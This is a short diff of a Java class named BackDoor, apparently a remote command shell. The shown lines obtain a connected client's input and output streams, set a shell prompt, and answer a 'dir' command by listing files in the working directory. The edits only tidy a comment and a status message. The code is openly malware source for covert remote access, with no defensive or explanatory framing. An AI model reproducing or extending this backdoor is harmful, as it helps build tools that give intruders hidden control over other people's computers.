@@ -22,8 +22,6 @@ public class BackDoor {
 			String prompt=System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
 			System.out.println();
 			
-			//File workDirectory=System.getProperty(null)
-			
 			InputStream in=client.getInputStream();
 			OutputStream out=client.getOutputStream();
 			
@@ -43,7 +41,7 @@ public class BackDoor {
 				}
 				
 				else if(clientCommand.equalsIgnoreCase("dir")){
-					writer.write("\nShould list files in the current directory \n\n");
+					//writer.write("\nShould list files in the current directory \n\n");
 					File currentDirectory=new File(workingDir);
 					File[] allFiles=currentDirectory.listFiles();
 					
